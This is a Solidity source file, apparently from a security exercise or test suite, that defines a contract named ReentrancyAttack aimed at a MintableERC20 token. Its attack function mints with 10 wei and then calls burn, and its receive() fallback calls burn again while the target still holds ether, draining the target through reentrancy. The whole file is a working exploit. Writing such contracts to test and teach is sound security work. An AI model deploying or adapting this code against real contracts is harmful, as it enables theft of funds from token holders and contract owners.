// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {MintableERC20} from "./MintableERC20.sol";

uint256 constant WITHDRAW_AMOUNT = 10 wei;

contract ReentrancyAttack {
    MintableERC20 public mintableERC20;

    constructor(address _mintableERC20) {
        mintableERC20 = MintableERC20(_mintableERC20);
    }

    function attack() public payable {
        mintableERC20.mint{value: WITHDRAW_AMOUNT}();
        mintableERC20.burn();
    }

    receive() external payable {
        if (address(mintableERC20).balance >= WITHDRAW_AMOUNT) {
            mintableERC20.burn();
        }
    }
}
